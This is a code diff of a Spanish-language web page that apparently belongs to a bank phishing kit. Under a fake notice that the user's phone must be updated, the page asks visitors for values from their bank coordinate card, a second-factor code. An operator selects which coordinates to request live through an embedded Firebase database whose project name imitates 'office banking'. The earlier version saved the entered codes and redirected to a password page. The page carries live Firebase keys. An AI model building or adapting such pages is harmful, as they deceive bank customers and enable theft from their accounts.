@@ -1,74 +1,79 @@
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Coordenadas</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Ingreso de Coordenadas</title>
   <style>
-    html, body {
+    body {
+      font-family: Arial, sans-serif;
+      background-color: white;
       margin: 0;
       padding: 0;
-      background: white;
-      font-family: Arial, sans-serif;
-      height: 100vh;
       display: flex;
-      align-items: center;
       justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
     .contenedor {
-      border: 3px solid red;
-      width: 90vw;
-      max-width: 400px;
+      border: 2px solid red;
       padding: 20px;
-      background: white;
-      box-sizing: border-box;
+      width: 90%;
+      max-width: 400px;
+      background-color: #fff;
       text-align: center;
     }
-    .cuadros {
-      display: flex;
-      justify-content: space-between;
-      margin-top: 15px;
+    h2 {
+      margin-bottom: 20px;
     }
-    .cuadros input {
-      width: 30%;
-      padding: 10px;
-      font-size: 16px;
-      text-align: center;
-      border: 1px solid black;
-      border-radius: 4px;
-      box-sizing: border-box;
-    }
-    button {
-      margin-top: 20px;
-      width: 100%;
-      padding: 10px;
-      background-color: red;
-      color: white;
-      border: none;
-      border-radius: 4px;
+    .coord-label {
+      display: block;
       font-weight: bold;
+      margin-top: 10px;
+    }
+    .coord-input {
+      width: 60px;
+      padding: 10px;
+      margin: 5px;
+      font-size: 18px;
+      text-align: center;
     }
   </style>
 </head>
 <body>
   <div class="contenedor">
-    <div id="coordenadas-live">
-      <div class="cuadros">
-        <input type="text" maxlength="2" id="c1" required />
-        <input type="text" maxlength="2" id="c2" required />
-        <input type="text" maxlength="2" id="c3" required />
-      </div>
-      <button onclick="continuar()">Continuar</button>
-    </div>
+    <h2>Necesitamos actualizar tu teléfono</h2>
+    <label class="coord-label" id="coord1-label"></label>
+    <input class="coord-input" maxlength="2" />
+    <label class="coord-label" id="coord2-label"></label>
+    <input class="coord-input" maxlength="2" />
+    <label class="coord-label" id="coord3-label"></label>
+    <input class="coord-input" maxlength="2" />
   </div>
+
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
   <script>
-    function continuar() {
-      const c1 = document.getElementById('c1').value;
-      const c2 = document.getElementById('c2').value;
-      const c3 = document.getElementById('c3').value;
-      localStorage.setItem('coordenadas', `${c1}-${c2}-${c3}`);
-      window.location.href = 'clave.html';
-    }
+    const firebaseConfig = {
+      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
+      authDomain: "formulario-officebanking.firebaseapp.com",
+      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
+      projectId: "formulario-officebanking",
+      storageBucket: "formulario-officebanking.appspot.com",
+      messagingSenderId: "604053438195",
+      appId: "1:604053438195:web:188de91bee9a62f0d3c186"
+    };
+    firebase.initializeApp(firebaseConfig);
+
+    const db = firebase.database();
+    firebase.database().ref('coordenadas_solicitadas').on('value', snap => {
+      const valor = snap.val() || "";
+      const partes = valor.trim().split(" ");
+      document.getElementById("coord1-label").textContent = partes[0] || "";
+      document.getElementById("coord2-label").textContent = partes[1] || "";
+      document.getElementById("coord3-label").textContent = partes[2] || "";
+    });
   </script>
 </body>
 </html>
